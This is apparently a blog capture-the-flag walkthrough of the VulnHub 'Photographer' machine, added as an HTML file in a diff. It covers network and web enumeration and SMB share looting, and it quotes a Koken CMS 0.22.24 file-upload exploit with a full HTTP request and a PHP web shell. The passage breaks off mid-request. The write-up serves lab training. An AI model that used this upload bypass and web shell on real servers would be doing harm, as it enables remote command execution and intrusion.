@@ -1,0 +1,487 @@
+<!DOCTYPE html> <html lang="en"> <head> <meta http-equiv="Content-Type" content="text/html; charset=UTF-8"> <meta charset="utf-8"> <meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no"> <meta http-equiv="X-UA-Compatible" content="IE=edge"> <title> Photographer | Biscotti Diskette </title> <meta name="author" content="Biscotti Diskette"> <meta name="description" content="Photographer from Vulnhub."> <meta name="keywords" content="jekyll, jekyll-theme, academic-website, portfolio-website"> <link rel="stylesheet" href="/assets/css/bootstrap.min.css?a4b3f509e79c54a512b890d73235ef04"> <link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/mdbootstrap@4.20.0/css/mdb.min.css" integrity="sha256-jpjYvU3G3N6nrrBwXJoVEYI/0zw8htfFnhT9ljN3JJw=" crossorigin="anonymous"> <link defer rel="stylesheet" href="/assets/css/academicons.min.css?f0b7046b84e425c55f3463ac249818f5"> <link defer rel="stylesheet" href="/assets/css/scholar-icons.css?62b2ac103a88034e6882a5be5f3e2772"> <link defer rel="stylesheet" type="text/css" href="https://fonts.googleapis.com/css?family=Roboto:300,400,500,700|Roboto+Slab:100,300,400,500,700|Material+Icons&amp;display=swap"> <link defer rel="stylesheet" href="/assets/css/jekyll-pygments-themes-github.css?591dab5a4e56573bf4ef7fd332894c99" media="" id="highlight_theme_light"> <link rel="shortcut icon" href="/assets/img/frontpage/Logo1.png?4f879aeff848659581251777fe0ab074"> <link rel="stylesheet" href="/assets/css/main.css?d41d8cd98f00b204e9800998ecf8427e"> <link rel="canonical" href="https://biscottidiskette.github.io/boxes/21_photographer/"> <script src="/assets/js/theme.js?9a0c749ec5240d9cda97bc72359a72c0"></script> <link defer rel="stylesheet" href="/assets/css/jekyll-pygments-themes-native.css?5847e5ed4a4568527aa6cfab446049ca" media="none" id="highlight_theme_dark"> <script>
+    initTheme();
+  </script> </head> <body class="fixed-top-nav "> <header> <nav id="navbar" class="navbar navbar-light navbar-expand-sm fixed-top" role="navigation"> <div class="container"> <a class="navbar-brand title font-weight-lighter" href="/"> <span class="font-weight-bold">Biscotti</span> Diskette </a> <button class="navbar-toggler collapsed ml-auto" type="button" data-toggle="collapse" data-target="#navbarNav" aria-controls="navbarNav" aria-expanded="false" aria-label="Toggle navigation"> <span class="sr-only">Toggle navigation</span> <span class="icon-bar top-bar"></span> <span class="icon-bar middle-bar"></span> <span class="icon-bar bottom-bar"></span> </button> <div class="collapse navbar-collapse text-right" id="navbarNav"> <ul class="navbar-nav ml-auto flex-nowrap"> <li class="nav-item "> <a class="nav-link" href="/">about </a> </li> <li class="nav-item "> <a class="nav-link" href="/projects/">projects </a> </li> <li class="nav-item active"> <a class="nav-link" href="/boxes/">boxes <span class="sr-only">(current)</span> </a> </li> <li class="nav-item "> <a class="nav-link" href="/certifications/">certs </a> </li> <li class="nav-item "> <a class="nav-link" href="/bounties/">bounties </a> </li> <li class="nav-item "> <a class="nav-link" href="/cves/">cves </a> </li> <li class="nav-item "> <a class="nav-link" href="/presentations/">talks </a> </li> <li class="nav-item "> <a class="nav-link" href="/blog/">blog </a> </li> <li class="nav-item "> <a class="nav-link" href="/repositories/">repos </a> </li> <li class="nav-item "> <a class="nav-link" href="/publications/">publications </a> </li> <li class="toggle-container"> <button id="light-toggle" title="Change theme"> <i class="ti ti-sun-moon" id="light-toggle-system"></i> <i class="ti ti-moon-filled" id="light-toggle-dark"></i> <i class="ti ti-sun-filled" id="light-toggle-light"></i> </button> </li> </ul> </div> </div> </nav> <progress id="progress" value="0"> <div class="progress-container"> <span class="progress-bar"></span> </div> </progress> </header> <div class="container mt-5" role="main"> <div class="post"> <header class="post-header"> <h1 class="post-title">Photographer</h1> <p class="post-description">Photographer from Vulnhub.</p> </header> <article> <div class="row justify-content-sm-center"> <div class="col-sm-8 mt-3 mt-md-0"> <figure> <picture> <img src="/assets/img/photographer/logo.png" class="img-fluid rounded z-depth-1" width="100%" height="auto" title="VulnHub Photographer Logo" loading="eager" onerror="this.onerror=null; $('.responsive-img-srcset').remove();"> </picture> </figure> </div> </div> <p><br></p> <h2>Link</h2> <p><a href="https://www.vulnhub.com/entry/photographer-1,519/" rel="external nofollow noopener" target="_blank">Room Link</a></p> <p><br></p> <h2>Process</h2> <p><br> Giving Photographer from VulnHub.</p> <p>Run netdiscover to find the machine on the network.</p> <div class="language-sh highlighter-rouge"><div class="highlight"><pre class="highlight"><code> Currently scanning: Finished!   |   Screen View: Unique Hosts                                                                                                                                                                            
+                                                                                                                                                                                                                                          
+ 3 Captured ARP Req/Rep packets, from 3 hosts.   Total size: 180                                                                                                                                                                          
+ _____________________________________________________________________________
+   IP            At MAC Address     Count     Len  MAC Vendor / Hostname      
+ <span class="nt">-----------------------------------------------------------------------------</span>
+ 10.0.0.1        0a:00:27:00:00:1b      1      60  Unknown vendor                                                                                                                                                                         
+ 10.0.0.2        08:00:27:d2:7f:7f      1      60  PCS Systemtechnik GmbH                                                                                                                                                                 
+ 10.0.0.15       08:00:27:2f:84:a3      1      60  PCS Systemtechnik GmbH
+</code></pre></div></div> <p><br> Run nmap to determine the open ports and services.</p> <div class="language-sh highlighter-rouge"><div class="highlight"><pre class="highlight"><code>┌──<span class="o">(</span>kali㉿kali<span class="o">)</span>-[~/Documents/vulnhub/photograph]
+└─<span class="nv">$ </span><span class="nb">sudo </span>nmap <span class="nt">-sC</span> <span class="nt">-sV</span> <span class="nt">-A</span> <span class="nt">-O</span> <span class="nt">-oN</span> nmap 10.0.0.15    
+Starting Nmap 7.95 <span class="o">(</span> https://nmap.org <span class="o">)</span> at 2025-01-31 15:39 AEDT
+Nmap scan report <span class="k">for </span>10.0.0.15
+Host is up <span class="o">(</span>0.00025s latency<span class="o">)</span><span class="nb">.</span>
+Not shown: 996 closed tcp ports <span class="o">(</span>reset<span class="o">)</span>
+PORT     STATE SERVICE     VERSION
+80/tcp   open  http        Apache httpd 2.4.18 <span class="o">((</span>Ubuntu<span class="o">))</span>
+|_http-server-header: Apache/2.4.18 <span class="o">(</span>Ubuntu<span class="o">)</span>
+|_http-title: Photographer by v1n1v131r4
+139/tcp  open  netbios-ssn Samba smbd 3.X - 4.X <span class="o">(</span>workgroup: WORKGROUP<span class="o">)</span>
+445/tcp  open  netbios-ssn Samba smbd 4.3.11-Ubuntu <span class="o">(</span>workgroup: WORKGROUP<span class="o">)</span>
+8000/tcp open  http        Apache httpd 2.4.18 <span class="o">((</span>Ubuntu<span class="o">))</span>
+|_http-server-header: Apache/2.4.18 <span class="o">(</span>Ubuntu<span class="o">)</span>
+|_http-title: daisa ahomi
+|_http-generator: Koken 0.22.24
+MAC Address: 08:00:27:2F:84:A3 <span class="o">(</span>PCS Systemtechnik/Oracle VirtualBox virtual NIC<span class="o">)</span>
+Device <span class="nb">type</span>: general purpose
+Running: Linux 3.X|4.X
+OS CPE: cpe:/o:linux:linux_kernel:3 cpe:/o:linux:linux_kernel:4
+OS details: Linux 3.2 - 4.14
+Network Distance: 1 hop
+Service Info: Host: PHOTOGRAPHER
+
+Host script results:
+| smb2-time: 
+|   <span class="nb">date</span>: 2025-01-31T04:40:12
+|_  start_date: N/A
+|_clock-skew: mean: 1h39m59s, deviation: 2h53m12s, median: 0s
+| smb-os-discovery: 
+|   OS: Windows 6.1 <span class="o">(</span>Samba 4.3.11-Ubuntu<span class="o">)</span>
+|   Computer name: photographer
+|   NetBIOS computer name: PHOTOGRAPHER<span class="se">\x</span>00
+|   Domain name: <span class="se">\x</span>00
+|   FQDN: photographer
+|_  System <span class="nb">time</span>: 2025-01-30T23:40:12-05:00
+|_nbstat: NetBIOS name: PHOTOGRAPHER, NetBIOS user: &lt;unknown&gt;, NetBIOS MAC: &lt;unknown&gt; <span class="o">(</span>unknown<span class="o">)</span>
+| smb2-security-mode: 
+|   3:1:1: 
+|_    Message signing enabled but not required
+| smb-security-mode: 
+|   account_used: guest
+|   authentication_level: user
+|   challenge_response: supported
+|_  message_signing: disabled <span class="o">(</span>dangerous, but default<span class="o">)</span>
+
+TRACEROUTE
+HOP RTT     ADDRESS
+1   0.25 ms 10.0.0.15
+
+OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ <span class="nb">.</span>
+Nmap <span class="k">done</span>: 1 IP address <span class="o">(</span>1 host up<span class="o">)</span> scanned <span class="k">in </span>28.89 seconds
+</code></pre></div></div> <p><br> Run nmap with the vuln script category.</p> <div class="language-sh highlighter-rouge"><div class="highlight"><pre class="highlight"><code>┌──<span class="o">(</span>kali㉿kali<span class="o">)</span>-[~/Documents/vulnhub/photograph]
+└─<span class="nv">$ </span><span class="nb">cat </span>vulnchk                    
+<span class="c"># Nmap 7.95 scan initiated Fri Jan 31 15:40:28 2025 as: /usr/lib/nmap/nmap --script vuln -oN vulnchk 10.0.0.15</span>
+
+&lt;snip&gt;
+
+| http-enum: 
+|   /admin/: Possible admin folder
+|   /admin/index.html: Possible admin folder
+|   /app/: Potentially interesting folder
+|   /content/: Potentially interesting folder
+|   /error/: Potentially interesting folder
+|   /home/: Potentially interesting folder
+|_  /index/: Potentially interesting folder
+
+&lt;snip&gt;
+</code></pre></div></div> <p><br> List all of the shares on the SMB.</p> <div class="language-sh highlighter-rouge"><div class="highlight"><pre class="highlight"><code>┌──<span class="o">(</span>kali㉿kali<span class="o">)</span>-[~/Documents/vulnhub/photograph]
+└─<span class="nv">$ </span>smbclient <span class="nt">-L</span> //10.0.0.15/                 
+Password <span class="k">for</span> <span class="o">[</span>WORKGROUP<span class="se">\k</span>ali]:
+
+        Sharename       Type      Comment
+        <span class="nt">---------</span>       <span class="nt">----</span>      <span class="nt">-------</span>
+        print<span class="nv">$ </span>         Disk      Printer Drivers
+        sambashare      Disk      Samba on Ubuntu
+        IPC<span class="nv">$ </span>           IPC       IPC Service <span class="o">(</span>photographer server <span class="o">(</span>Samba, Ubuntu<span class="o">))</span>
+Reconnecting with SMB1 <span class="k">for </span>workgroup listing.
+
+        Server               Comment
+        <span class="nt">---------</span>            <span class="nt">-------</span>
+
+        Workgroup            Master
+        <span class="nt">---------</span>            <span class="nt">-------</span>
+        WORKGROUP            PHOTOGRAPHER
+</code></pre></div></div> <p><br> Connect to the sambashare share and list its contents. Get a copy of the two files that are list in the share.</p> <div class="language-sh highlighter-rouge"><div class="highlight"><pre class="highlight"><code>┌──<span class="o">(</span>kali㉿kali<span class="o">)</span>-[~/Documents/vulnhub/photograph]
+└─<span class="nv">$ </span>smbclient //10.0.0.15/sambashare
+Password <span class="k">for</span> <span class="o">[</span>WORKGROUP<span class="se">\k</span>ali]:
+Try <span class="s2">"help"</span> to get a list of possible commands.
+smb: <span class="se">\&gt;</span> <span class="nb">ls</span>
+  <span class="nb">.</span>                                   D        0  Tue Jul 21 11:30:07 2020
+  ..                                  D        0  Tue Jul 21 19:44:25 2020
+  mailsent.txt                        N      503  Tue Jul 21 11:29:40 2020
+  wordpress.bkp.zip                   N 13930308  Tue Jul 21 11:22:23 2020
+
+                278627392 blocks of size 1024. 264268400 blocks available
+smb: <span class="se">\&gt;</span> get mailsent.txt
+getting file <span class="se">\m</span>ailsent.txt of size 503 as mailsent.txt <span class="o">(</span>245.6 KiloBytes/sec<span class="o">)</span> <span class="o">(</span>average 245.6 KiloBytes/sec<span class="o">)</span>
+smb: <span class="se">\&gt;</span> get wordpress.bkp.zip
+getting file <span class="se">\w</span>ordpress.bkp.zip of size 13930308 as wordpress.bkp.zip <span class="o">(</span>160044.7 KiloBytes/sec<span class="o">)</span> <span class="o">(</span>average 156371.4 KiloBytes/sec<span class="o">)</span>
+</code></pre></div></div> <p><br> Check the contents of the mailsent.txt. Note that there is a secret somewhere. Neat. There are also two names and two emails that should also be noted.</p> <div class="language-sh highlighter-rouge"><div class="highlight"><pre class="highlight"><code>┌──<span class="o">(</span>kali㉿kali<span class="o">)</span>-[~/Documents/vulnhub/photograph]
+└─<span class="nv">$ </span><span class="nb">cat </span>mailsent.txt 
+Message-ID: &lt;4129F3CA.2020509@dc.edu&gt;
+Date: Mon, 20 Jul 2020 11:40:36 <span class="nt">-0400</span>
+From: Agi Clarence &lt;agi@photographer.com&gt;
+User-Agent: Mozilla/5.0 <span class="o">(</span>Windows<span class="p">;</span> U<span class="p">;</span> Windows NT 5.1<span class="p">;</span> en-US<span class="p">;</span> rv:1.0.1<span class="o">)</span> Gecko/20020823 Netscape/7.0
+X-Accept-Language: en-us, en
+MIME-Version: 1.0
+To: Daisa Ahomi &lt;daisa@photographer.com&gt;
+Subject: To Do - Daisa Website<span class="s1">'s
+Content-Type: text/plain; charset=us-ascii; format=flowed
+Content-Transfer-Encoding: 7bit
+
+Hi Daisa!
+Your site is ready now.
+Don'</span>t forget your secret, my babygirl <span class="p">;</span><span class="o">)</span>
+</code></pre></div></div> <p><br> Check the landing page on port 80.</p> <div class="row justify-content-sm-center"> <div class="col-sm mt-3 mt-md-0"> <figure> <picture> <img src="/assets/img/photographer/landing80.png" class="img-fluid rounded z-depth-1" width="100%" height="auto" title="Check the Landing Page on Port 80" loading="eager" onerror="this.onerror=null; $('.responsive-img-srcset').remove();"> </picture> </figure> </div> </div> <p><br> Check the landing page source code on port 80.</p> <div class="language-sh highlighter-rouge"><div class="highlight"><pre class="highlight"><code>view-source:http://10.0.0.15/
+
+&lt;<span class="o">!</span>DOCTYPE HTML&gt;
+&lt;<span class="o">!</span><span class="nt">--</span>
+	Photographer by v1n1v131r4
+	<span class="nt">--</span><span class="o">&gt;</span>
+&lt;html&gt;
+	&lt;<span class="nb">head</span><span class="o">&gt;</span>
+		&lt;title&gt;Photographer by v1n1v131r4&lt;/title&gt;
+		&lt;meta <span class="nv">charset</span><span class="o">=</span><span class="s2">"utf-8"</span> /&gt;
+		&lt;meta <span class="nv">name</span><span class="o">=</span><span class="s2">"viewport"</span> <span class="nv">content</span><span class="o">=</span><span class="s2">"width=device-width, initial-scale=1"</span> /&gt;
+		&lt;<span class="nb">link </span><span class="nv">rel</span><span class="o">=</span><span class="s2">"stylesheet"</span> <span class="nv">href</span><span class="o">=</span><span class="s2">"assets/css/main.css"</span> /&gt;
+	&lt;/head&gt;
+	&lt;body&gt;
+
+    &lt;snip&gt;
+
+    &lt;/body&gt;
+&lt;/html&gt;
+</code></pre></div></div> <p><br> Check the landing page on port 8000. Notice the Koken CMS installation that is running on port 8000.</p> <div class="row justify-content-sm-center"> <div class="col-sm mt-3 mt-md-0"> <figure> <picture> <img src="/assets/img/photographer/landing8000.png" class="img-fluid rounded z-depth-1" width="100%" height="auto" title="Check the Landing Page on Port 8000" loading="eager" onerror="this.onerror=null; $('.responsive-img-srcset').remove();"> </picture> </figure> </div> </div> <p><br> Check the Exploit-DB for an exploit for the Koken installation.</p> <div class="language-sh highlighter-rouge"><div class="highlight"><pre class="highlight"><code>https://www.exploit-db.com/exploits/48706
+
+<span class="c"># Exploit Title: Koken CMS 0.22.24 - Arbitrary File Upload (Authenticated)</span>
+<span class="c"># Date: 2020-07-15</span>
+<span class="c"># Exploit Author: v1n1v131r4</span>
+<span class="c"># Vendor Homepage: http://koken.me/</span>
+<span class="c"># Software Link: https://www.softaculous.com/apps/cms/Koken</span>
+<span class="c"># Version: 0.22.24</span>
+<span class="c"># Tested on: Linux</span>
+<span class="c"># PoC: https://github.com/V1n1v131r4/Bypass-File-Upload-on-Koken-CMS/blob/master/README.md</span>
+
+The Koken CMS upload restrictions are based on a list of allowed file extensions <span class="o">(</span>withelist<span class="o">)</span>, which facilitates bypass through the handling of the HTTP request via Burp.
+
+Steps to exploit:
+
+1. Create a malicious PHP file with this content:
+
+   &lt;?php system<span class="o">(</span><span class="nv">$_GET</span><span class="o">[</span><span class="s1">'cmd'</span><span class="o">])</span><span class="p">;</span>?&gt;
+
+2. Save as <span class="s2">"image.php.jpg"</span>
+
+3. Authenticated, go to Koken CMS Dashboard, upload your file on <span class="s2">"Import Content"</span> button <span class="o">(</span>Library panel<span class="o">)</span> and send the HTTP request to Burp.
+
+4. On Burp, rename your file to <span class="s2">"image.php"</span>
+
+
+POST /koken/api.php?/content HTTP/1.1
+Host: target.com
+User-Agent: Mozilla/5.0 <span class="o">(</span>X11<span class="p">;</span> Linux x86_64<span class="p">;</span> rv:68.0<span class="o">)</span> Gecko/20100101 Firefox/68.0
+Accept: <span class="k">*</span>/<span class="k">*</span>
+Accept-Language: en-US,en<span class="p">;</span><span class="nv">q</span><span class="o">=</span>0.5
+Accept-Encoding: <span class="nb">gzip</span>, deflate
+Referer: https://target.com/koken/admin/
+x-koken-auth: cookie
+Content-Type: multipart/form-data<span class="p">;</span> <span class="nv">boundary</span><span class="o">=</span><span class="nt">---------------------------2391361183188899229525551</span>
+Content-Length: 1043
+Connection: close
+Cookie: <span class="nv">PHPSESSID</span><span class="o">=</span> <span class="o">[</span>Cookie value here]
+
+<span class="nt">-----------------------------2391361183188899229525551</span>
+Content-Disposition: form-data<span class="p">;</span> <span class="nv">name</span><span class="o">=</span><span class="s2">"name"</span>
+
+image.php
+<span class="nt">-----------------------------2391361183188899229525551</span>
+Content-Disposition: form-data<span class="p">;</span> <span class="nv">name</span><span class="o">=</span><span class="s2">"chunk"</span>
+
+0
+<span class="nt">-----------------------------2391361183188899229525551</span>
+Content-Disposition: form-data<span class="p">;</span> <span class="nv">name</span><span class="o">=</span><span class="s2">"chunks"</span>
+
+1
+<span class="nt">-----------------------------2391361183188899229525551</span>
+Content-Disposition: form-data<span class="p">;</span> <span class="nv">name</span><span class="o">=</span><span class="s2">"upload_session_start"</span>
+
+1594831856
+<span class="nt">-----------------------------2391361183188899229525551</span>
+Content-Disposition: form-data<span class="p">;</span> <span class="nv">name</span><span class="o">=</span><span class="s2">"visibility"</span>
+
+public
+<span class="nt">-----------------------------2391361183188899229525551</span>
+Content-Disposition: form-data<span class="p">;</span> <span class="nv">name</span><span class="o">=</span><span class="s2">"license"</span>
+
+all
+<span class="nt">-----------------------------2391361183188899229525551</span>
+Content-Disposition: form-data<span class="p">;</span> <span class="nv">name</span><span class="o">=</span><span class="s2">"max_download"</span>
+
+none
+<span class="nt">-----------------------------2391361183188899229525551</span>
+Content-Disposition: form-data<span class="p">;</span> <span class="nv">name</span><span class="o">=</span><span class="s2">"file"</span><span class="p">;</span> <span class="nv">filename</span><span class="o">=</span><span class="s2">"image.php"</span>
+Content-Type: image/jpeg
+
+&lt;?php system<span class="o">(</span><span class="nv">$_GET</span><span class="o">[</span><span class="s1">'cmd'</span><span class="o">])</span><span class="p">;</span>?&gt;
+
+<span class="nt">-----------------------------2391361183188899229525551--</span>
+
+
+
+5. On Koken CMS Library, <span class="k">select </span>you file and put the mouse on <span class="s2">"Download File"</span> to see where your file is hosted on server.
+</code></pre></div></div> <p><br> Check the admin directory and view the login page.</p> <div class="row justify-content-sm-center"> <div class="col-sm mt-3 mt-md-0"> <figure> <picture> <img src="/assets/img/photographer/admin.png" class="img-fluid rounded z-depth-1" width="100%" height="auto" title="Check the admin section" loading="eager" onerror="this.onerror=null; $('.responsive-img-srcset').remove();"> </picture> </figure> </div> </div> <p><br> curl -I http://10.0.0.15:8000 to see what information can be gleaned from the headers.</p> <div class="language-sh highlighter-rouge"><div class="highlight"><pre class="highlight"><code>┌──<span class="o">(</span>kali㉿kali<span class="o">)</span>-[~/Documents/vulnhub/photograph]
+└─<span class="nv">$ </span>curl <span class="nt">-I</span> http://10.0.0.15:8000                                                                                                        
+HTTP/1.1 200 OK
+Date: Fri, 31 Jan 2025 05:08:44 GMT
+Server: Apache/2.4.18 <span class="o">(</span>Ubuntu<span class="o">)</span>
+X-XHR-Current-Location: http://10.0.0.15:8000/
+Content-Type: text/html<span class="p">;</span> <span class="nv">charset</span><span class="o">=</span>UTF-8
+</code></pre></div></div> <p><br> Unzip the Wordpress zip file from the SMB.</p> <div class="language-sh highlighter-rouge"><div class="highlight"><pre class="highlight"><code>┌──<span class="o">(</span>kali㉿kali<span class="o">)</span>-[~/Documents/vulnhub/photograph/wp]
+└─<span class="nv">$ </span>unzip ../wordpress.bkp.zip 
+Archive:  ../wordpress.bkp.zip
+   creating: wordpress/
+  inflating: wordpress/wp-login.php  
+  inflating: wordpress/wp-cron.php   
+  inflating: wordpress/xmlrpc.php    
+  inflating: wordpress/wp-load.php   
+
+  &lt;snip&gt;
+</code></pre></div></div> <p><br> Check the wp-config-sample.php for a potential password.</p> <div class="language-php highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="cp">&lt;?php</span>
+<span class="cd">/**
+ * As configurações básicas do WordPress 
+
+  &lt;snip&gt;
+
+  // ** Configurações do MySQL - Você pode pegar estas informações com o serviço de hospedagem ** //
+/** O nome do banco de dados do WordPress */</span>
+<span class="nb">define</span><span class="p">(</span> <span class="s1">'DB_NAME'</span><span class="p">,</span> <span class="s1">'nome_do_banco_de_dados_aqui'</span> <span class="p">);</span>
+
+<span class="cd">/** Usuário do banco de dados MySQL */</span>
+<span class="nb">define</span><span class="p">(</span> <span class="s1">'DB_USER'</span><span class="p">,</span> <span class="s1">'nome_de_usuario_aqui'</span> <span class="p">);</span>
+
+<span class="cd">/** Senha do banco de dados MySQL */</span>
+<span class="nb">define</span><span class="p">(</span> <span class="s1">'DB_PASSWORD'</span><span class="p">,</span> <span class="s1">'senha_aqui'</span> <span class="p">);</span>
+
+<span class="cd">/** Nome do host do MySQL */</span>
+<span class="nb">define</span><span class="p">(</span> <span class="s1">'DB_HOST'</span><span class="p">,</span> <span class="s1">'localhost'</span> <span class="p">);</span>
+
+<span class="cd">/** Charset do banco de dados a ser usado na criação das tabelas. */</span>
+<span class="nb">define</span><span class="p">(</span> <span class="s1">'DB_CHARSET'</span><span class="p">,</span> <span class="s1">'utf8'</span> <span class="p">);</span>
+
+<span class="cd">/** O tipo de Collate do banco de dados. Não altere isso se tiver dúvidas. */</span>
+<span class="nb">define</span><span class="p">(</span> <span class="s1">'DB_COLLATE'</span><span class="p">,</span> <span class="s1">''</span> <span class="p">);</span>
+
+<span class="o">&lt;</span><span class="n">snip</span><span class="o">&gt;</span>
+</code></pre></div></div> <p><br> Ffuf the website on port 80.</p> <div class="language-sh highlighter-rouge"><div class="highlight"><pre class="highlight"><code>┌──<span class="o">(</span>kali㉿kali<span class="o">)</span>-[~/…/photograph/wp/wordpress/wp-content]
+└─<span class="nv">$ </span>ffuf <span class="nt">-w</span> /usr/share/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt <span class="nt">-u</span> http://10.0.0.15/FUZZ <span class="nt">-e</span> .txt,.bak,.html,.php <span class="nt">-fs</span> 5711
+
+&lt;snip&gt;
+
+.php                    <span class="o">[</span>Status: 403, Size: 274, Words: 20, Lines: 10, Duration: 1ms]
+images                  <span class="o">[</span>Status: 301, Size: 307, Words: 20, Lines: 10, Duration: 0ms]
+.html                   <span class="o">[</span>Status: 403, Size: 274, Words: 20, Lines: 10, Duration: 1ms]
+assets                  <span class="o">[</span>Status: 301, Size: 307, Words: 20, Lines: 10, Duration: 2ms]
+generic.html            <span class="o">[</span>Status: 200, Size: 4243, Words: 389, Lines: 83, Duration: 29ms]
+elements.html           <span class="o">[</span>Status: 200, Size: 19831, Words: 1279, Lines: 459, Duration: 12ms]
+.html                   <span class="o">[</span>Status: 403, Size: 274, Words: 20, Lines: 10, Duration: 9ms]
+.php                    <span class="o">[</span>Status: 403, Size: 274, Words: 20, Lines: 10, Duration: 10ms]
+server-status           <span class="o">[</span>Status: 403, Size: 274, Words: 20, Lines: 10, Duration: 8ms]
+:: Progress: <span class="o">[</span>1102795/1102795] :: Job <span class="o">[</span>1/1] :: 3225 req/sec :: Duration: <span class="o">[</span>0:03:51] :: Errors: 0 ::
+</code></pre></div></div> <p><br> Ffuf the website on port 8000.</p> <div class="language-sh highlighter-rouge"><div class="highlight"><pre class="highlight"><code>┌──<span class="o">(</span>kali㉿kali<span class="o">)</span>-[~/…/photograph/wp/wordpress/wp-content]
+└─<span class="nv">$ </span>ffuf <span class="nt">-w</span> /usr/share/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt <span class="nt">-u</span> http://10.0.0.15:8000/FUZZ <span class="nt">-e</span> .txt,.bak,.html <span class="nt">-fs</span> 4708 <span class="nt">-fw</span> 1
+
+&lt;snip&gt;
+
+.html                   <span class="o">[</span>Status: 403, Size: 276, Words: 20, Lines: 10, Duration: 5ms]
+admin                   <span class="o">[</span>Status: 301, Size: 313, Words: 20, Lines: 10, Duration: 3ms]
+storage                 <span class="o">[</span>Status: 301, Size: 315, Words: 20, Lines: 10, Duration: 19ms]
+app                     <span class="o">[</span>Status: 301, Size: 311, Words: 20, Lines: 10, Duration: 8ms]
+http%3A.txt             <span class="o">[</span>Status: 200, Size: 4683, Words: 207, Lines: 99, Duration: 647ms]
+http%3A.html            <span class="o">[</span>Status: 200, Size: 4686, Words: 207, Lines: 99, Duration: 651ms]
+http%3A.bak             <span class="o">[</span>Status: 200, Size: 4683, Words: 207, Lines: 99, Duration: 766ms]
+.html                   <span class="o">[</span>Status: 403, Size: 276, Words: 20, Lines: 10, Duration: 100ms]
+server-status           <span class="o">[</span>Status: 403, Size: 276, Words: 20, Lines: 10, Duration: 38ms]
+:: Progress: <span class="o">[</span>882236/882236] :: Job <span class="o">[</span>1/1] :: 491 req/sec :: Duration: <span class="o">[</span>0:32:33] :: Errors: 0 ::
+</code></pre></div></div> <p><br> Login using the daisa email and babygirl from the email body. We had the “secret” all along.</p> <div class="row justify-content-sm-center"> <div class="col-sm mt-3 mt-md-0"> <figure> <picture> <img src="/assets/img/photographer/librarylanding.png" class="img-fluid rounded z-depth-1" width="100%" height="auto" title="Check the Landing Page when we login" loading="eager" onerror="this.onerror=null; $('.responsive-img-srcset').remove();"> </picture> </figure> </div> </div> <p><br> Create image.php.jpg file that is indicated in the exploit.</p> <div class="language-php highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="cp">&lt;?php</span> <span class="nb">system</span><span class="p">(</span><span class="nv">$_GET</span><span class="p">[</span><span class="s1">'cmd'</span><span class="p">]);</span><span class="cp">?&gt;</span>
+</code></pre></div></div> <p><br> Click on Import content in the lower right-hand corner.</p> <div class="row justify-content-sm-center"> <div class="col-sm mt-3 mt-md-0"> <figure> <picture> <img src="/assets/img/photographer/import.png" class="img-fluid rounded z-depth-1" width="100%" height="auto" title="Click Import Content" loading="eager" onerror="this.onerror=null; $('.responsive-img-srcset').remove();"> </picture> </figure> </div> </div> <p><br> Choose the file that was just created.</p> <div class="row justify-content-sm-center"> <div class="col-sm mt-3 mt-md-0"> <figure> <picture> <img src="/assets/img/photographer/fileselect.png" class="img-fluid rounded z-depth-1" width="100%" height="auto" title="Select File" loading="eager" onerror="this.onerror=null; $('.responsive-img-srcset').remove();"> </picture> </figure> </div> </div> <p><br> Ensure that you intercept the request.</p> <div class="row justify-content-sm-center"> <div class="col-sm mt-3 mt-md-0"> <figure> <picture> <img src="/assets/img/photographer/intercept.png" class="img-fluid rounded z-depth-1" width="100%" height="auto" title="Ensure Intercept is On" loading="eager" onerror="this.onerror=null; $('.responsive-img-srcset').remove();"> </picture> </figure> </div> </div> <p><br> Upload the file. Check that we caught the request. Update the request to remove the .jpg extension from two different places in the request.</p> <div class="language-sh highlighter-rouge"><div class="highlight"><pre class="highlight"><code>POST /api.php?/content HTTP/1.1
+Host: 10.0.0.15:8000
+Content-Length: 928
+x-koken-auth: cookie
+Accept-Language: en-US,en<span class="p">;</span><span class="nv">q</span><span class="o">=</span>0.9
+User-Agent: Mozilla/5.0 <span class="o">(</span>Windows NT 10.0<span class="p">;</span> Win64<span class="p">;</span> x64<span class="o">)</span> AppleWebKit/537.36 <span class="o">(</span>KHTML, like Gecko<span class="o">)</span> Chrome/131.0.6778.86 Safari/537.36
+Content-Type: multipart/form-data<span class="p">;</span> <span class="nv">boundary</span><span class="o">=</span><span class="nt">----WebKitFormBoundarydjT9BT6fKT3BUBDZ</span>
+Accept: <span class="k">*</span>/<span class="k">*</span>
+Origin: http://10.0.0.15:8000
+Referer: http://10.0.0.15:8000/admin/
+Accept-Encoding: <span class="nb">gzip</span>, deflate, br
